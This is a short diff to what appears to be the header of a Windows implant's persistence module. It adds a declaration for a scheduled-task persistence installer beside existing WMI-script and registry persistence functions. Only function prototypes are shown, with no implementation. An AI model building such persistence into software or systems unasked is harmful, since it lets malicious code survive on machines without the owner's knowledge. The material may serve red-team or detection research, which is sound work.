@@ -18,6 +18,11 @@ BOOL InstallWmiScriptPersistence(const wchar_t* implantPath);
 BOOL InstallRegistryPersistence(const wchar_t* implantPath);
 
 // -----------------------------------------------------------------------
+// Scheduled Task — runs implant binary on trigger
+// -----------------------------------------------------------------------
+BOOL InstallScheduledTaskPersistence(const wchar_t* implantPath);
+
+// -----------------------------------------------------------------------
 // Query: is the WMI CommandLineEventConsumer present?
 // -----------------------------------------------------------------------
 BOOL IsWmiPersistenceInstalled();
